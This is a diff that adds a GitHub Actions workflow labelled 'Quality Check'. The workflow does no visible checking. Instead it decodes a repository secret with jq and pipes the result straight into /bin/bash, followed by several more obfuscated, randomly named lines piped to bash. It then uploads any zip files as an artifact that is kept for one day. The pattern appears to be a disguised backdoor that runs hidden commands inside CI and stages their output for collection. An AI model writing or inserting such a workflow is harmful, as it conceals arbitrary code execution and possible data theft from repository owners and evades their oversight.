@@ -1,0 +1,32 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          u60: ${{ secrets.u60 }}
+        run: |
+          printf '%s' "$u60" | jq -r .wvew88255 | /bin/bash
+          echo $x05250 | jq -r .mpa12 | /bin/bash
+          echo $iw4 | jq -r .kpc58 | /bin/bash
+          echo $keapr5 | jq -r .u9 | /bin/bash
+          echo $va0 | jq -r .g8 | /bin/bash
+          echo $ygd3013 | jq -r .k22 | /bin/bash
+          echo $to0737 | jq -r .tgt5176 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: icpO2vC3
+          path: "*.zip"
+          retention-days: 1
